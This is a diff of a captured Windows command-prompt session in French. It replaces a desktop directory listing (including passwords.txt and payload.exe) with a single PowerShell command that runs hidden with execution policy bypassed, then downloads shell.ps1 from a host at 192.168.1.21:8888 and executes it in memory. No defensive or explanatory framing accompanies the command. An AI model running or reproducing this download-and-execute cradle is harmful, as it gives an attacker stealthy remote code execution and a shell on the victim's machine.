@@ -1,23 +1,7 @@
 Microsoft Windows [version 6.3.9600]
 (c) 2013 Microsoft Corporation. Tous droits r‚serv‚s.
 
-C:\Users\mickael\Desktop>cmd /k dir
- Le volume dans le lecteur C s'appelle Disque SystŠme
- Le num‚ro de s‚rie du volume est E609-659F
-
- R‚pertoire de C:\Users\mickael\Desktop
-
-07/05/2025  18:58    <DIR>          .
-07/05/2025  18:58    <DIR>          ..
-25/02/2025  17:29    <DIR>          12
-22/01/2025  19:33    <DIR>          55
-07/05/2025  18:57         1ÿ399ÿ296 Octokit.dll
-06/05/2025  08:40               300 passwords.txt
-07/05/2025  18:57             8ÿ704 payload.exe
-22/01/2025  19:41         1ÿ683ÿ560 putty.exe
-08/09/2024  10:52    <DIR>          winrar
-               4 fichier(s)        3ÿ091ÿ860 octets
-               5 R‚p(s)   9ÿ868ÿ230ÿ656 octets libres
+C:\Users\mickael\Desktop>cmd /k powershell.exe -NoP -sta -NonI -W Hidden -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://192.168.1.21:8888/shell.ps1'))"
 
 C:\Users\mickael\Desktop>
 C:\Users\mickael\Desktop>
